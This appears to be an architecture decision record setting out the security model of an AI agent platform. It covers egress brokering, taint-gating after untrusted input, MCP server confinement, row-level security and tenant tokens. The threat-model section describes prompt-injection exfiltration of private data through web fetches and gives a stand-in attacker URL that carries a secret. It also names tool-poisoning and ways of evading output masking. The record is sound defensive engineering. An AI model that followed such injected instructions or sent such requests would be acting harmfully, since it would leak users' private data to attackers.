# 13. Security model: egress broker on all model-influenced channels + taint gate, MCP confinement, provider-native tools disabled, RLS, RPC-bound tenant tokens, constrained bypass

Date: 2026-06-10
Status: Accepted

## Context

The core threat is the lethal trifecta: an agent that has access to private data, is
exposed to untrusted content (web pages, MCP tool outputs, file contents), and can make
external network requests. All three legs converge in the orchestrator's model context.
An adversarial web page or MCP tool output can instruct the model to exfiltrate private
data via webfetch or websearch.

The draft claimed "breaking any one leg defeats the attack." That claim was false as
drawn: all three legs converged in the orchestrator's model context, and the sandbox
egress control did not sit on the model-driven egress paths (webfetch, websearch, MCP
http transport ran outside the sandbox's network namespace). A web read of
`https://attacker.tld/?secret=...` is a write to the attacker.

Additional gaps: RLS was asserted as a backstop without a concrete enforcement
mechanism; blob identity was global (cross-tenant existence oracle); the bypass mode
was not constrained; MCP servers were not modeled as a supply-chain and injection
vector; provider-native tools bypassed all tool-runtime controls.

## Decision

**Egress broker on every model-influenced channel.** All outbound network from
model-influenced tools — in-sandbox bash, webfetch, websearch, and MCP http transports
— is routed through a single egress broker enforcing a per-session deny-by-default
allowlist. There is no arbitrary egress anywhere; tool-runtime's own egress is itself a
per-session allowlist enforced at the network policy and in the webfetch/MCP clients.

**webfetch and websearch are external communication, not reads.** Both tools carry
`EgressClass = External` and are subject to the egress allowlist and the taint gate.
They are not parallelized as harmless ReadOnly tools.

**Taint-tracking gate.** The orchestrator's policy package taint-tracks untrusted
ingress: once any untrusted content (web, MCP, or file output classified as untrusted)
enters a session's context, external-comms tools targeting non-allowlisted hosts require
a human ask gate for the rest of that turn or session. This severs the external
communication leg on the model-driven path — the leg an injection actually controls.
The required security test: inject a web page instructing exfiltration via webfetch and
assert the request is blocked or gated.

**SPIFFE/SPIRE mTLS for service-to-service identity.** Each service gets a short-lived
auto-rotated X.509 SVID from the SPIRE Workload API. mTLS is enforced on all
service-to-service calls. A gRPC interceptor checks the peer SPIFFE ID against a
per-RPC allowlist (coarse verb-level RBAC). The dev static-cert fallback requires
`BOLTROPE_DEV_INSECURE=1`, generates ephemeral certs at startup, logs a loud warning,
and is compiled out of release images. If not in dev mode and the SPIFFE provider is
absent, the process exits.

**RPC-bound short-lived tenant token.** The verified tenant_id and principal are placed
in a typed context.Context value and propagated to tool-runtime as a short-lived signed
token (PASETO/JWT) with: `aud` = callee's SPIFFE ID, `exp` in seconds, a jti + nonce
for replay protection, bound to the specific RPC (method + session_id). A captured
token cannot be replayed across calls or after expiry. Threat-model acknowledgement:
orchestrator compromise equals tenant compromise; mitigations include RPC binding,
short expiry, event-derived tenancy on read paths (projectord derives tenancy from
event rows via RLS, not an orchestrator assertion), and anomaly monitoring for an
orchestrator asserting many distinct tenants in a short window.

**Concrete RLS** per ADR-0011: non-owner role, SET LOCAL GUC from the verified token,
FORCE ROW LEVEL SECURITY, INSERT/UPDATE policies, predicate-removed cross-tenant
integration test.

**Tenant-scoped blobs** per ADR-0011: composite PK (tenant_id, ref), fetch authorized
by tenant + ownership.

**MCP server confinement.** Each MCP server (stdio and http) runs inside its own
confined sandbox with deny-by-default egress through the same broker — never as a bare
child of tool-runtime. The SPIRE Workload API socket and SVID are never exposed into
that namespace. MCP tool descriptions and schemas are treated as untrusted content
(tool-poisoning is a known attack); first registration of a server and each of its
tools requires explicit human approval. MCP server identity and version are pinned
(hash); a newly-appearing tool is gated. MCP tool outputs flow through masking and
taint-tracking.

**Provider-native/server-side tools disabled in v1.** Provider-native tools (Anthropic
web_search/web_fetch, OpenAI Responses built-ins) execute inside the provider,
bypassing tool-runtime's registry, JSON-Schema validation, the ask gate, the egress
broker, and the read-only/mutating scheduler. The gateway carries a
`supports_server_side_tools` capability flag and a hard policy switch. Enabling them
is deferred; if ever enabled they must model provider-network egress explicitly and
amend the trifecta security model.

**Output masking is defense-in-depth only, never a containment boundary.** Masking
catches only known/registry/pattern secrets and is trivially defeated by base64, hex,
splitting across calls, or paraphrase. The real exfiltration control is egress
restriction. Masking is kept for log and telemetry hygiene via slog LogValuer
redaction. This is stated explicitly so the diagram cannot imply a safety level masking
cannot deliver.

**Prompt-cache prefix scoping.** Only tenant-agnostic content (system prompt, tool
schemas) may live in a shared stable prefix. Private or session data is never placed
in a cached prefix. Cache keys are scoped per (tenant_id[, session]) to prevent
cross-tenant cache hits or hit-latency timing oracles. Required test: two tenants never
share a cache entry containing private content.

**Client edge authN/Z.** OIDC/bearer with iss/aud/exp validation, signing algorithm
pinning (reject alg=none), JWKS cache with rotation. Session_id on every Run/Control
is verified to be owned by the authenticated principal. Per-tenant rate limiting and
per-tenant concurrent-session and budget caps. The grpc-gateway REST facade enforces
identical auth, ownership, and rate limiting.

**Constrained bypass mode.** Bypass is a server-side, audited setting that is forbidden
when untrusted content is present or in multi-tenant mode, never settable by the client
request or the model or hooks, and emitted as a prominent audit event when active. Even
under bypass, the egress broker denial and tenant isolation remain non-bypassable (they
are infra controls, not policy). Bypass collapses only the deny/mode/allow/ask pipeline,
never the infra controls, and only for an operator who explicitly enabled it outside
the untrusted/multi-tenant guardrails.

**Multi-tenant honesty.** v1 shared-kernel containers are safe only for single-tenant
or trusted-code deployments. Multi-tenant execution of mutually-untrusted code requires
the microVM/gVisor runtime behind RuntimePort (deferred, ADR-0005). The RLS data model
is future-proofing, not a claim that v1 safely runs mutually-untrusted tenants' code
on shared hosts.

## Consequences

- The trifecta is severed on the leg an injection actually controls (external
  communication) by placing the egress broker and taint gate on every model-driven
  outbound path, not just the sandbox network namespace.
- The required exfil test makes the control falsifiable: it either blocks/gates or fails.
- Concrete RLS with a predicate-removed integration test means a single forgotten
  application-layer WHERE predicate does not become a cross-tenant breach.
- MCP confinement and approval-on-first-use make tool-poisoning and supply-chain
  attacks auditable and gated.
- Disabling provider-native tools in v1 keeps the security model sound at the cost of
  those features; re-enabling them requires an explicit threat-model amendment.
- The bypass constraint prevents an operator convenience feature from becoming a
  security hole in untrusted or multi-tenant deployments.
- The multi-tenant honesty statement means the README/threat-model cannot mislead
  operators into thinking v1 containers are safe for mutually-untrusted code.
